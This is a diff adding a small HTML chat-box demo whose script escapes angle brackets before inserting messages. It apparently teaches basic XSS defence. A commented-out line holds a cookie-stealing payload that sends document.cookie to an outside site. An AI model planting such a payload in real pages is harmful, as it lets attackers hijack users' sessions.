@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        #chat-box{
+            width: 400px;
+            height: 600px;
+            border:1px solid black;
+        }
+
+    </style>
+</head>
+<body>
+    &lt;html&gt;&lt;/html&gt;
+    <div id="chat-box">
+
+    </div>
+    <input type="text" id="message">
+    <input id="btnSend" type="button" value="发送" >
+
+    <script >
+
+        let btnSend = document.getElementById("btnSend")
+        let message = document.getElementById("message")
+        let chat = document.getElementById("chat-box")
+
+        // <input type="button"  value="呵呵" onclick="javascript:location.href='http://www.itzhihu.cn?str='+document.cookie" />
+        
+        btnSend.onclick = function(){
+            let str = message.value.replace(/\</g,"&lt;");
+            str = str.replace(/\>/g,"&gt;");
+            chat.innerHTML += str+"<br/>"
+            message.value = "";
+        }
+      
+    </script>
+
+</body>
+</html>
